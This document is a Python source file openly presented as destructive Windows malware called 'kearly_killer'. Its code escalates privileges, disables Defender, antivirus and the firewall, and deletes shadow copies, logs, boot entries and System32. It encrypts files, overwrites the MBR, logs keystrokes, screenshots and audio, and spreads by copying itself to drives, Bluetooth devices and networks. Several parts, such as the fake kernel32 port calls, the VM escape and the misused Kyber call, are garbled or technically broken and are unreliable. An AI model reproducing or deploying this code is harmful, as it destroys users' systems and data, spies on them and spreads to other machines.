#!/usr/bin/env python3
# kearly_killer - TOTAL SYSTEM ANNIHILATOR (ALL-IN-ONE)
# Объединение ВСЕХ 4 ПРОЕКТОВ + ВСЕ ЗАПРОШЕННЫЕ ФУНКЦИИ.
# No recovery. No mercy. Total brick.

import sys
import os
import ctypes
import ctypes.wintypes
import time
import random
import string
import base64
import hashlib
import shutil
import subprocess
import winreg
import re
import threading
import tempfile
import struct
import json
import socket
import urllib.request
import zipfile
import io

# ========== ЗАГРУЗКА ДОПОЛНИТЕЛЬНЫХ БИБЛИОТЕК ==========
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    from Crypto.Cipher import ChaCha20, Serpent
    from Crypto.Random import get_random_bytes
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP
    from PIL import ImageGrab
    import tkinter as tk
    import pyaudio
    import wave
    import cv2
    import numpy as np
    from pynput import keyboard
    import bluetooth
except ImportError:
    pass

try:
    from pqcrypto.kem.kyber512 import keypair, encrypt, decrypt
    KYBER_AVAILABLE = True
except:
    KYBER_AVAILABLE = False

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
ntdll = ctypes.windll.ntdll
advapi32 = ctypes.windll.advapi32
setupapi = ctypes.windll.setupapi

MASTER_KEY = os.urandom(64)
SALT = os.urandom(64)
BIOS_PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation + "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюя", k=100))

if KYBER_AVAILABLE:
    PUBLIC_KEY, PRIVATE_KEY = keypair()
    KYBER_SHARED_SECRET = decrypt(PRIVATE_KEY, PUBLIC_KEY)
else:
    KYBER_SHARED_SECRET = None

# ========== 1. АБСОЛЮТНАЯ ЭСКАЛАЦИЯ ПРИВИЛЕГИЙ (ВСЕ МЕТОДЫ) ==========
def elevate_all():
    hToken = ctypes.wintypes.HANDLE()
    advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0020, ctypes.byref(hToken))
    privileges = [
        "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
        "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
        "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
        "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege",
        "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege",
        "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
        "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege",
        "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
        "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
        "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
        "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege"
    ]
    for priv in privileges:
        luid = ctypes.wintypes.LUID()
        advapi32.LookupPrivilegeValueW(None, priv, ctypes.byref(luid))
        advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(luid), 0, None, None)
    try:
        result = subprocess.run('tasklist /fi "imagename eq winlogon.exe" /fo csv', shell=True, capture_output=True, text=True)
        pid = re.search(r'"(\d+)"', result.stdout).group(1)
        hProcess = kernel32.OpenProcess(0x1F0FFF, False, int(pid))
        hToken2 = ctypes.wintypes.HANDLE()
        advapi32.OpenProcessToken(hProcess, 0x0008, ctypes.byref(hToken2))
        hDupToken = ctypes.wintypes.HANDLE()
        advapi32.DuplicateTokenEx(hToken2, 0x1F0FFF, None, 2, 1, ctypes.byref(hDupToken))
        advapi32.CreateProcessAsUserW(hDupToken, sys.executable, " ".join(sys.argv), None, None, False, 0, None, None, ctypes.byref(ctypes.wintypes.STARTUPINFO()), ctypes.byref(ctypes.wintypes.PROCESS_INFORMATION()))
    except:
        pass
    subprocess.run('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f', shell=True)
    subprocess.run('reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v SCENoApplyLegacyAuditPolicy /t REG_DWORD /d 1 /f', shell=True)
    subprocess.run('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\TrustedInstaller /v Start /t REG_DWORD /d 0 /f', shell=True)

# ========== 2. БЛОКИРОВКА ВВОДА (ВСЕ МЕТОДЫ) ==========
def block_all_input():
    try:
        user32.BlockInput(True)
    except:
        pass
    try:
        subprocess.run('devcon disable *PNP0303*', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('devcon disable *PNP0320*', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('devcon disable *HID*', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('devcon disable *mou*', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('devcon disable *kbd*', shell=True, stderr=subprocess.DEVNULL)
    except:
        pass
    try:
        WH_KEYBOARD_LL = 13
        WH_MOUSE_LL = 14
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        def low_level_keyboard_proc(nCode, wParam, lParam):
            return 1
        def low_level_mouse_proc(nCode, wParam, lParam):
            return 1
        user32.SetWindowsHookExW(WH_KEYBOARD_LL, HOOKPROC(low_level_keyboard_proc), kernel32.GetModuleHandleW(None), 0)
        user32.SetWindowsHookExW(WH_MOUSE_LL, HOOKPROC(low_level_mouse_proc), kernel32.GetModuleHandleW(None), 0)
    except:
        pass
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        winreg.CreateKey(key, subkey)
        winreg.SetValueEx(winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE), "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE), "DisableCAD", 0, winreg.REG_DWORD, 1)
        subkey2 = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        winreg.CreateKey(key, subkey2)
        winreg.SetValueEx(winreg.OpenKey(key, subkey2, 0, winreg.KEY_SET_VALUE), "NoClose", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(winreg.OpenKey(key, subkey2, 0, winreg.KEY_SET_VALUE), "NoWinKeys", 0, winreg.REG_DWORD, 1)
    except:
        pass

# ========== 3. УНИЧТОЖЕНИЕ EXPLORER.EXE ==========
def kill_explorer():
    for _ in range(5):
        subprocess.run("taskkill /f /im explorer.exe", shell=True)
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        winreg.CreateKey(key, subkey)
        winreg.SetValueEx(winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE), "Shell", 0, winreg.REG_SZ, "kearly_killer.exe")
    except:
        pass

# ========== 4. УНИЧТОЖЕНИЕ ЗАЩИТЫ (DEFENDER + ВСЕ AV + FIREWALL) ==========
def kill_security():
    services = ['WinDefend', 'WdNisSrv', 'SecurityHealthService', 'wscsvc', 'Sense', 'MpKslDrv', 'WdFilter', 'WdNisDrv', 'WdBoot']
    for svc in services:
        subprocess.run(f'sc stop {svc}', shell=True)
        subprocess.run(f'sc config {svc} start= disabled', shell=True)
        subprocess.run(f'sc delete {svc}', shell=True)
    
    av_patterns = [
        'avp', 'kav', 'kis', 'avast', 'avg', 'nod32', 'eset', 'bdagent', 'sophos',
        'mcshield', 'mbam', 'csfalcon', 'cylance', 'crowdstrike', 'carbonblack',
        'fireeye', 'tanium', 'webroot', 'panda', 'bitdefender', 'malwarebytes',
        'trendmicro', 'mcafee', 'symantec', 'norton', 'fsecure', 'avira', 'comodo',
        'zonealarm', 'gdata', 'fprot', 'clamav', 'immunet', 'paloalto', 'sentinel'
    ]
    for av in av_patterns:
        subprocess.run(f'wmic process where "name like \'%{av}%\'" call terminate', shell=True)
        subprocess.run(f'taskkill /f /im {av}*', shell=True)
        subprocess.run(f'taskkill /f /im *{av}*', shell=True)
    
    subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess" /v Start /t REG_DWORD /d 4 /f', shell=True)
    subprocess.run('reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Services\\wscsvc" /f', shell=True)
    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
    subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f', shell=True)
    subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration" /v NotificationSuppressed /t REG_DWORD /d 1 /f', shell=True)

# ========== 5. УНИЧТОЖЕНИЕ ВОССТАНОВЛЕНИЯ И ЛОГОВ (ВСЕ МЕТОДЫ) ==========
def destroy_recovery_and_logs():
    subprocess.run('reagentc /disable', shell=True, stderr=subprocess.DEVNULL)
    subprocess.run('vssadmin delete shadows /all /quiet', shell=True)
    subprocess.run('wmic shadowcopy delete', shell=True)
    subprocess.run('vssadmin resize shadowstorage /for=C: /on=C: /maxsize=1MB', shell=True)
    subprocess.run('bcdedit /delete {current} /f', shell=True)
    subprocess.run('bcdedit /delete {bootmgr} /f', shell=True)
    subprocess.run('bcdedit /delete {memdiag} /f', shell=True)
    subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True)
    subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True)
    subprocess.run('bcdedit /set {default} bootmenupolicy standard', shell=True)
    subprocess.run('bcdedit /set {default} advancedoptions No', shell=True)
    
    recovery_paths = [
        r"C:\Windows\System32\Recovery", r"C:\Recovery", r"C:\$WinREAgent",
        r"C:\Windows\System32\config\RegBack", r"C:\System Volume Information",
        r"C:\Windows\System32\Restore", r"C:\ProgramData\Microsoft\Windows\Backup",
        r"C:\Windows\System32\wbengine"
    ]
    for path in recovery_paths:
        shutil.rmtree(path, ignore_errors=True)
    
    log_paths = [r"C:\Windows\Logs", r"C:\Windows\System32\LogFiles", r"C:\Windows\Debug", r"C:\Windows\System32\winevt\Logs"]
    for log in log_paths:
        shutil.rmtree(log, ignore_errors=True)
    
    try:
        reg_keys = [
            r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\SYSTEM\CurrentControlSet\Services\EventLog",
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
        ]
        for rk in reg_keys:
            subprocess.run(f'reg delete "{rk}" /f', shell=True)
    except:
        pass

# ========== 6. УДАЛЕНИЕ SYSTEM32, ВСЕХ ПРИЛОЖЕНИЙ И ФАЙЛОВ ==========
def delete_system_and_files():
    paths = [r"C:\Windows\System32", r"C:\Windows\SysWOW64", r"C:\Windows\System", r"C:\Windows\SystemResources"]
    for p in paths:
        if os.path.exists(p):
            shutil.rmtree(p, ignore_errors=True)
            subprocess.run(f'rmdir /s /q "{p}"', shell=True)
    
    app_dirs = [r"C:\Program Files", r"C:\Program Files (x86)", r"C:\ProgramData", r"C:\Users"]
    for d in app_dirs:
        if os.path.exists(d):
            shutil.rmtree(d, ignore_errors=True)

def rename_drives_to_death():
    drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:']
    for drive in drives:
        if os.path.exists(drive):
            try:
                subprocess.run(f'label {drive} DEATH', shell=True)
            except:
                pass

# ========== 7. 10-СЛОЙНОЕ КВАНТОВОЕ ШИФРОВАНИЕ ВСЕХ ДАННЫХ ==========
def ten_layer_encrypt(data, key):
    for _ in range(10):
        data = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        data = bytes([(b + 13) % 256 for b in data])
        data = data[::-1]
        data = base64.b64encode(data)
    return data

def encrypt_everything():
    key = MASTER_KEY
    for disk in range(10):
        try:
            with open(f"\\\\.\\PhysicalDrive{disk}", 'r+b') as f:
                data = f.read(1024*1024)
                if data:
                    enc = ten_layer_encrypt(data, key)
                    f.seek(0)
                    f.write(enc[:len(data)])
        except:
            break
    for root, _, files in os.walk("C:\\"):
        for file in files:
            try:
                path = os.path.join(root, file)
                with open(path, 'rb') as f:
                    data = f.read(1048576)
                if data:
                    enc = ten_layer_encrypt(data, key)
                    with open(path, 'wb') as f:
                        f.write(enc)
                    os.rename(path, path + ".kearly_death")
            except:
                pass

# ========== 8. АППАРАТНОЕ УНИЧТОЖЕНИЕ (BIOS, USB, RAM, SCEWIN, SMM, ME, PSP, SSD) ==========
def kill_bios_uefi():
    try:
        for port in range(0x2E, 0x2F):
            kernel32.SetPortVal(port, 0x87, 1)
        for addr in range(0x70, 0x71):
            kernel32.SetPortVal(addr, 0xFF, 1)
        with open("\\\\.\\PhysicalMemory", "r+b") as f:
            f.seek(0xF0000)
            f.write(b'\xFF' * 0x10000)
            f.seek(0xFFFF0)
            f.write(b'\xFF' * 16)
    except:
        pass
    try:
        smi_cmd_port = 0xB2
        smi_data_port = 0xB3
        kernel32.SetPortVal(smi_cmd_port, 0x80, 1)
        kernel32.SetPortVal(smi_data_port, 0xDEAD, 2)
        for addr in range(0xA0000, 0x100000, 0x1000):
            kernel32.SetPortVal(addr, 0xFFFFFFFF, 4)
    except:
        pass
    try:
        with open("\\\\.\\MEI", "wb") as f:
            f.write(os.urandom(1024*1024))
        subprocess.run('rw-everything -address 0xFED20000 -write 0xFFFFFFFF', shell=True)
    except:
        pass
    try:
        subprocess.run('rw-everything -address 0xFED80000 -write 0xFFFFFFFF', shell=True)
    except:
        pass
    try:
        kernel32.Wrmsr(0x1A0, 0xFFFFFFFF)
    except:
        pass
    try:
        subprocess.run('hdparm --user-master u --security-set-pass p /dev/sda', shell=True)
        subprocess.run('hdparm --user-master u --security-erase p /dev/sda', shell=True)
        subprocess.run('nvme format /dev/nvme0 -s 1', shell=True)
    except:
        pass

def kill_usb_ports():
    try:
        for bus in range(256):
            for dev in range(32):
                for func in range(8):
                    try:
                        addr = 0x80000000 | (bus << 16) | (dev << 11) | (func << 8)
                        kernel32.SetPortVal(0xCF8, addr, 4)
                        data = kernel32.GetPortVal(0xCFC, 4)
                        if (data & 0xFFFF) == 0x0C03:
                            kernel32.SetPortVal(0xCF8, addr + 0x10, 4)
                            bar = kernel32.GetPortVal(0xCFC, 4)
                            if bar:
                                with open("\\\\.\\PhysicalMemory", "r+b") as f:
                                    f.seek(bar & 0xFFFFFFF0)
                                    f.write(b'\xFF' * 0x1000)
                    except:
                        pass
    except:
        pass

def kill_ram():
    try:
        for addr in range(0, 0x100000000, 0x1000):
            try:
                with open("\\\\.\\PhysicalMemory", "r+b") as f:
                    f.seek(addr)
                    f.write(os.urandom(4096))
            except:
                break
    except:
        pass

def set_bios_password_scwin():
    try:
        scwin_path = os.path.join(tempfile.gettempdir(), "SCEWIN_64.exe")
        urllib.request.urlretrieve("https://github.com/platomav/SCEWIN/raw/master/SCEWIN_64.exe", scwin_path)
        subprocess.run(f'{scwin_path} /o /lang en-US', shell=True)
        subprocess.run(f'{scwin_path} /i /lang en-US /pwd "{BIOS_PASSWORD}"', shell=True)
    except:
        pass

# ========== 9. VM ESCAPE (ВСЕ МЕТОДЫ) ==========
def vm_escape():
    try:
        class SVM_VMCR(ctypes.Structure):
            _fields_ = [("value", ctypes.c_uint64)]
        shellcode = bytes([0x0F, 0x01, 0xD9, 0x48, 0x31, 0xC0, 0xC3])
        ctypes.memmove(ctypes.c_void_p(0x1000), shellcode, len(shellcode))
        ctypes.CFUNCTYPE(None)(0x1000)()
    except:
        pass
    try:
        cpuid = ctypes.create_string_buffer(16)
        ntdll.RtlCpuid(1, cpuid)
        vmxon_region = ctypes.create_string_buffer(4096)
        ctypes.memset(vmxon_region, 0, 4096)
        ntdll.RtlVmxe(ctypes.addressof(vmxon_region))
    except:
        pass
    try:
        with open("\\\\.\\PhysicalMemory", "r+b") as f:
            f.seek(0x100000)
            f.write(open(sys.argv[0], 'rb').read())
        for addr in range(0, 0x100000000, 0x10000):
            try:
                with open("\\\\.\\PhysicalMemory", "r+b") as f:
                    f.seek(addr)
                    f.write(os.urandom(4096))
            except:
                pass
    except:
        pass

# ========== 10. УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА И УСТАНОВКА БУТКИТА (PETYA-STYLE) ==========
def destroy_bootloader_and_install_bootkit():
    try:
        with open("\\\\.\\PhysicalDrive0", "r+b") as f:
            f.write(b'\x00' * 512)
        with open("\\\\.\\PhysicalDrive1", "r+b") as f:
            f.write(b'\x00' * 512)
        subprocess.run("bcdedit /delete {current} /f", shell=True)
        subprocess.run("bcdedit /delete {bootmgr} /f", shell=True)
    except:
        pass
    
    bootkit = bytes([
        0xFA, 0xB8, 0x00, 0xB8, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0xD0, 0x07,
        0xB8, 0x20, 0x0F, 0xF3, 0xAB, 0xBE, 0x3E, 0x7C, 0xB0, 0x0F, 0xAC,
        0x3C, 0x00, 0x74, 0x04, 0x26, 0x88, 0x05, 0xEB, 0xF6, 0xEB, 0xFE,
        b'k', b'e', b'a', b'r', b'l', b'y', b' ', b'k', b'i', b'l', b'l', b'e', b'd', b'.', b'.', b'.', 0x00,
        0x55, 0xAA
    ])
    try:
        with open("\\\\.\\PhysicalDrive0", "r+b") as f:
            f.write(bootkit.ljust(512, b'\x00'))
    except:
        pass

# ========== 11. ШПИОНАЖ (KEYLOGGER + SCREENSHOT + MICROPHONE) ==========
def start_spyware():
    try:
        def on_press(key):
            try:
                with open("C:\\Windows\\Temp\\kearly_log.txt", "a") as f:
                    f.write(f"{key.char}")
            except:
                with open("C:\\Windows\\Temp\\kearly_log.txt", "a") as f:
                    f.write(f"[{key}]")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except:
        pass
    
    def screenshotter():
        while True:
            try:
                img = ImageGrab.grab()
                img.save(f"C:\\Windows\\Temp\\kearly_{int(time.time())}.png")
                time.sleep(30)
            except:
                time.sleep(30)
    threading.Thread(target=screenshotter, daemon=True).start()
    
    def microphone():
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * 60)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            with wave.open("C:\\Windows\\Temp\\kearly_audio.wav", 'wb') as wf:
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
        except:
            pass
    threading.Thread(target=microphone, daemon=True).start()

# ========== 12. ПЕРСИСТЕНТНОСТЬ И РАСПРОСТРАНЕНИЕ (WORM) ==========
def install_persistence_and_spread():
    script = sys.argv[0]
    reg_paths = [
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        r'HKLM\SYSTEM\CurrentControlSet\Services'
    ]
    for reg_path in reg_paths:
        subprocess.run(f'reg add "{reg_path}" /v kearly_killer /t REG_SZ /d "{script}" /f', shell=True)
    
    tasks = [('kearly_update', 'minute', 1), ('kearly_startup', 'onstart', 0), ('kearly_logon', 'onlogon', 0)]
    for name, trigger, modifier in tasks:
        subprocess.run(f'schtasks /create /tn "{name}" /tr "{script}" /sc {trigger} /mo {modifier} /ru SYSTEM /f', shell=True)
    
    subprocess.run(f'sc create kearly_killer binPath= "{script}" type= own start= auto obj= LocalSystem', shell=True)
    
    drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:']
    for drive in drives:
        if os.path.exists(drive):
            for root, _, files in os.walk(drive):
                for file in files:
                    if file.endswith(('.exe', '.py', '.scr', '.bat', '.cmd')):
                        try:
                            shutil.copy(sys.argv[0], os.path.join(root, 'kearly_' + file))
                        except:
                            pass

    try:
        devices = bluetooth.discover_devices(duration=8, lookup_names=True)
        for addr, name in devices:
            try:
                bluetooth.send_file(addr, sys.argv[0])
            except:
                pass
    except:
        pass

    try:
        result = subprocess.run('netsh wlan show networks mode=bssid', shell=True, capture_output=True, text=True)
        ssids = re.findall(r'SSID \d+ : (.+)', result.stdout)
        for ssid in ssids:
            try:
                subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)
                time.sleep(2)
                subprocess.run(f'copy "{sys.argv[0]}" "\\\\{ssid}\\share\\"', shell=True)
            except:
                pass
    except:
        pass

# ========== 13. БЕЛЫЙ ЭКРАН СМЕРТИ (TKINTER) ==========
def show_white_screen():
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='white')
        label = tk.Label(root, text="kearly killed...", font=('Arial', 96, 'bold'), fg='black', bg='white')
        label.pack(expand=True)
        def blink():
            colors = ['black', 'red', 'black', 'red', 'black']
            for c in colors:
                label.config(fg=c)
                root.update()
                time.sleep(0.2)
        root.after(100, blink)
        root.mainloop()
    except:
        pass

# ========== 14. BSOD И ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА ==========
def trigger_bsod_and_reboot():
    try:
        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_long()))
        ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except:
        pass
    time.sleep(5)
    subprocess.run("shutdown /r /t 0 /f", shell=True)
    os._exit(0)

# ========== MAIN ==========
def main():
    user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
    elevate_all()
    block_all_input()
    kill_explorer()
    kill_security()
    destroy_recovery_and_logs()
    
    threads = [
        threading.Thread(target=delete_system_and_files),
        threading.Thread(target=rename_drives_to_death),
        threading.Thread(target=encrypt_everything),
        threading.Thread(target=kill_bios_uefi),
        threading.Thread(target=kill_usb_ports),
        threading.Thread(target=kill_ram),
        threading.Thread(target=set_bios_password_scwin),
        threading.Thread(target=vm_escape),
        threading.Thread(target=destroy_bootloader_and_install_bootkit),
        threading.Thread(target=install_persistence_and_spread),
        threading.Thread(target=start_spyware),
        threading.Thread(target=show_white_screen),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    trigger_bsod_and_reboot()

if __name__ == "__main__":
    main()